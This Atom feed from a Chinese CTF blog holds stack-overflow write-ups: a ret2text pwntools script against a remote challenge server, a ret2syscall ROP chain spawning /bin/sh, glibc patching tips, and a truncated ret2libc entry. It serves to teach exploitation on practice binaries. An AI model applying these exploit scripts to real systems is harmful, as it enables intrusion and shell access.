<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>技术栈</title>
  
  <subtitle>Share station</subtitle>
  <link href="https://www.rgzzplus.com/atom.xml" rel="self"/>
  
  <link href="https://www.rgzzplus.com/"/>
  <updated>2022-10-03T01:39:42.462Z</updated>
  <id>https://www.rgzzplus.com/</id>
  
  <author>
    <name>rgzzplus</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>pwnstack</title>
    <link href="https://www.rgzzplus.com/2022/10/03/pwnstack/"/>
    <id>https://www.rgzzplus.com/2022/10/03/pwnstack/</id>
    <published>2022-10-03T01:38:34.000Z</published>
    <updated>2022-10-03T01:39:42.462Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=de8efbe6-17ae-11ed-9827-fa163e4fa633&amp;task_category_id=2">题目地址</a> pwnstack</p></blockquote><h2 id="0x1"><a class="markdownIt-Anchor" href="#0x1"></a> 0x1</h2><p>下载文件到本地后，首先，file 看看文件类型，顺便看看保护机制。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/下载/pwnstack$ file pwn2</span><br><span class="line">pwn2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=62aa40d64871e142a32827b4e403772e72f67fba, not stripped</span><br><span class="line">sakura@Kylin:~/下载/pwnstack$ checksec pwn2</span><br><span class="line">[*] &#x27;/home/sakura/下载/pwnstack/pwn2&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>可以看到，这是一个 64 位程序，并且只开启了 NX 保护机制。</p><h2 id="0x2"><a class="markdownIt-Anchor" href="#0x2"></a> 0x2</h2><p>再拖进 IDA 中看看源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">160</span>]; <span class="comment">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));  <span class="comment">//将 buf全部置为 0</span></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xB1</span>uLL);   <span class="comment">//0xB1 = 177 bytes</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 <span class="title function_">initsetbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  initsetbuf(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;this is pwn1,can you do that??&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于只开启了 NX，只需溢出 buf 覆盖函数返回值即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">peda$ </span><span class="language-bash">pattern create 200</span></span><br><span class="line"><span class="meta">peda$ </span><span class="language-bash">pattern offset .........</span></span><br></pre></td></tr></table></figure><p><img src="/2022/10/03/pwnstack/image-20220922202634809.png" alt="image-20220922202634809"></p><p><img src="/2022/10/03/pwnstack/image-20220922202345579.png" alt="image-20220922202345579"></p><p>得到填充长度为 168 byte</p><h2 id="0x3"><a class="markdownIt-Anchor" href="#0x3"></a> 0x3</h2><p>先看看 pwn2 中是否有 system() 调用，如果有就不用我们自己构建了。</p><p><img src="/2022/10/03/pwnstack/image-20220922220713163.png" alt="image-20220922220713163"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&quot;./pwn2&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>, <span class="number">54665</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">system= <span class="number">0x400766</span></span><br><span class="line"><span class="comment"># 这里我用 0x400766，而不是 0x400762，是因为不能破坏栈的结构。</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa0</span>)+ <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(system) </span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x4"><a class="markdownIt-Anchor" href="#0x4"></a> 0x4</h2><p><strong>测试</strong></p><p><img src="/2022/10/03/pwnstack/image-20220922221704374.png" alt="image-20220922221704374"></p><p>远程测试：</p><p><img src="/2022/10/03/pwnstack/image-20220922221935298.png" alt="image-20220922221935298"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://adworld.xctf.org.cn/challenges/details?hash=de8efbe6-17ae-11ed-9827-fa163e4fa633&amp;amp;task_category_id=2&quot;&gt;题目</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="pwnstack" scheme="https://www.rgzzplus.com/tags/pwnstack/"/>
    
  </entry>
  
  <entry>
    <title>PWN题目加载指定版本的glibc</title>
    <link href="https://www.rgzzplus.com/2022/10/03/PWN%E9%A2%98%E7%9B%AE%E5%8A%A0%E8%BD%BD%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC%E7%9A%84glibc/"/>
    <id>https://www.rgzzplus.com/2022/10/03/PWN%E9%A2%98%E7%9B%AE%E5%8A%A0%E8%BD%BD%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC%E7%9A%84glibc/</id>
    <published>2022-10-03T01:38:08.000Z</published>
    <updated>2022-10-03T01:40:20.172Z</updated>
    
    <content type="html"><![CDATA[<h3 id="指定libc"><a class="markdownIt-Anchor" href="#指定libc"></a> 指定libc</h3><p>两种方法。一种方法是用patchelf改变elf的ld链接器和libc加载。另一种是跑了个脚本，其实原理都差不多。</p><p>先把libc和ld链接器cp到pwn题目录,用绝对路径不嫌麻烦也行。</p><p>patchelf：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ./ld.so.2 ./elfname</span><br><span class="line">patchelf --set-rpath ./libc-2.2?.so ./elfname</span><br></pre></td></tr></table></figure><p>脚本：(注意 libc 与 elfname 要在一个文件夹下)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">sh = process(<span class="string">&#x27;./elfname&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>参考：</p><p><a href="https://surager.pub/_posts/2020-03-10-pwn%E9%A2%98%E7%9B%AE%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95%E5%8A%A0%E8%BD%BDlibc%E7%89%88%E6%9C%AC/">Pwn题目本地调试加载libc版本</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;指定libc&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#指定libc&quot;&gt;&lt;/a&gt; 指定libc&lt;/h3&gt;
&lt;p&gt;两种方法。一种方法是用patchelf改变elf的ld链接器和libc加载。另一种是跑了个脚本，其实原理都差不多。&lt;/p</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="libc" scheme="https://www.rgzzplus.com/tags/libc/"/>
    
  </entry>
  
  <entry>
    <title>ret2syscall</title>
    <link href="https://www.rgzzplus.com/2022/09/18/ret2syscall/"/>
    <id>https://www.rgzzplus.com/2022/09/18/ret2syscall/</id>
    <published>2022-09-18T02:24:54.000Z</published>
    <updated>2022-09-29T14:23:18.811Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow">题目地址</a> ret2syscall</p></blockquote><h2 id="0x1"><a class="markdownIt-Anchor" href="#0x1"></a> 0x1</h2><p>下载文件到本地后，首先，file 看看文件类型，顺便看看文件类型。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/下载/ret2syscall$ file rop</span><br><span class="line">rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped</span><br><span class="line">sakura@Kylin:~/下载/ret2syscall$ checksec rop</span><br><span class="line">[*] &#x27;/home/sakura/下载/ret2syscall/rop&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以看到，这是一个 32 位程序，并且只开启了 NX 保护机制。</p><h2 id="0x2"><a class="markdownIt-Anchor" href="#0x2"></a> 0x2</h2><p>再拖进 IDA 中看看源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们从源码中可以看到 gets() 函数，它能读取字符串直到输入回车才终止。所以它是我们溢出的目标函数，而它把读入的数据放在 v4 中，v4相对 ebp 偏移为 0x64 + 0x8 (源码第3行)。所以我们需要填充 112 个字节才能覆盖返回地址。由于开启了 NX，我们无法自己用shellcode填充栈来获得 shell，所以我们利用程序中的<strong>代码片段(gadgets)</strong> 来获得 shell。</p><h2 id="0x3"><a class="markdownIt-Anchor" href="#0x3"></a> 0x3</h2><p>我们需要构造的函数：<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code></p><p>其中该程序是 32 位，所以我们需要使得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eax = 0xb</span><br><span class="line">ebx --&gt; &quot;/bin/sh&quot;</span><br><span class="line">ecx = 0</span><br><span class="line">edx = 0</span><br></pre></td></tr></table></figure><p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><p>用下面这条命令来查找程序中所有 <code>pop reg; ret;</code> 指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/下载/ret2syscall$ ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;pop&#x27;</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809d7b2 : pop ds ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d5 : pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x0804838e : pop ebp ; ret</span><br><span class="line">0x080a9a45 : pop ebp ; ret 0x10</span><br><span class="line">0x08096a29 : pop ebp ; ret 0x14</span><br><span class="line">0x08070d76 : pop ebp ; ret 0xc</span><br><span class="line">0x0804854a : pop ebp ; ret 4</span><br><span class="line">0x08049c00 : pop ebp ; ret 8</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0804838d : pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a44 : pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a28 : pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d75 : pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048549 : pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bff : pop edi ; pop ebp ; ret 8</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0805c508 : pop edi ; pop esi ; ret</span><br><span class="line">0x0804846f : pop edi ; ret</span><br><span class="line">0x08049a1b : pop edi ; ret 4</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806eb6a : pop edx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080671ea : pop es ; pop edi ; ret</span><br><span class="line">0x0806742a : pop es ; ret</span><br><span class="line">0x08092259 : pop esi ; pop ebp ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x0804838c : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a43 : pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a27 : pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d74 : pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048548 : pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfe : pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x0804846e : pop esi ; pop edi ; ret</span><br><span class="line">0x08049a1a : pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a95 : pop esi ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080bb146 : pop esp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br><span class="line">0x080639f9 : pop ss ; ret 0x2c73</span><br><span class="line">0x080643ba : pop ss ; ret 0x3273</span><br><span class="line">0x080639e4 : pop ss ; ret 0x3e73</span><br><span class="line">0x080643a0 : pop ss ; ret 0x4c73</span><br><span class="line">0x080639cf : pop ss ; ret 0x5073</span><br><span class="line">0x080639ba : pop ss ; ret 0x6273</span><br><span class="line">0x08064386 : pop ss ; ret 0x6673</span><br><span class="line">0x08061f05 : pop ss ; ret 0x830f</span><br></pre></td></tr></table></figure><p>我们分别选择以下指令来布置寄存器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>此外，我们需要获得 /bin/sh 字符串对应的地址 和 <code>int 0x80</code> 对应的地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/下载/ret2syscall$ ROPgadget --binary rop  --string &#x27;/bin/sh&#x27; </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br><span class="line">sakura@Kylin:~/下载/ret2syscall$ ROPgadget --binary rop  --only &#x27;int&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure><p>接下来就是构建payload了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">|+————————+|</span><br><span class="line">|+aaaaaaaa+|</span><br><span class="line">|+........+|</span><br><span class="line">|+aaaaaaaa+|</span><br><span class="line">|+pop eax; ret+|</span><br><span class="line">|+0xb+|</span><br><span class="line">|+pop edx; pop ecx; pop ebx; ret+|</span><br><span class="line">|+0x0+|</span><br><span class="line">|+0x0+|</span><br><span class="line">|+/bin/sh+|</span><br><span class="line">|+int 0x80+|</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ret2syscall.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">112</span>)</span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += p32(int_0x80)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x4"><a class="markdownIt-Anchor" href="#0x4"></a> 0x4</h2><p><strong>测试</strong></p><p><img src="/2022/09/18/ret2syscall/image-20220915000135702.png" alt="image-20220915000135702"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow&quot;&gt;题目地址&lt;/a&gt; ret2syscall&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="ret2syscall" scheme="https://www.rgzzplus.com/tags/ret2syscall/"/>
    
  </entry>
  
  <entry>
    <title>ret2libc</title>
    <link href="https://www.rgzzplus.com/2022/09/18/ret2libc/"/>
    <id>https://www.rgzzplus.com/2022/09/18/ret2libc/</id>
    <published>2022-09-18T02:24:41.000Z</published>
    <updated>2022-09-18T02:52:32.005Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow">题目地址</a> ret2libc</p></blockquote><h1 id="ret2libc"><a class="markdownIt-Anchor" href="#ret2libc"></a> ret2libc</h1><h2 id="0x1"><a class="markdownIt-Anchor" href="#0x1"></a> 0x1</h2><p>将文件下载到本地后，file 查看文件类型，顺便 checksec 看看保护机制。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/下载/ret2libc/ret2libc1$ file ret2libc1</span><br><span class="line">ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped</span><br><span class="line">sakura@Kylin:~/下载/ret2libc/ret2libc1$ checksec ret2libc1</span><br><span class="line">[*] &#x27;/home/sakura/下载/ret2libc/ret2libc1/ret2libc1&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>源程序为 32 位，开启了 NX 保护。</p><h2 id="0x2"><a class="markdownIt-Anchor" href="#0x2"></a> 0x2</h2><p>拖进 IDA 来看一下程序源代码，确定漏洞位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里有个 gets 函数，可以确定就是 gets 函数发生了栈溢出。</p><h2 id="0x3"><a class="markdownIt-Anchor" href="#0x3"></a> 0x3</h2><p>利用 ropgadget 看看是否有 /bin/sh 字符串。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/下载/ret2libc/ret2libc1$ ROPgadget --binary ret2libc1 --string &#x27;/bin/sh&#x27; </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048720 : /bin/sh</span><br></pre></td></tr></table></figure><p>确实存在，在 IDA 中查找一下是否有 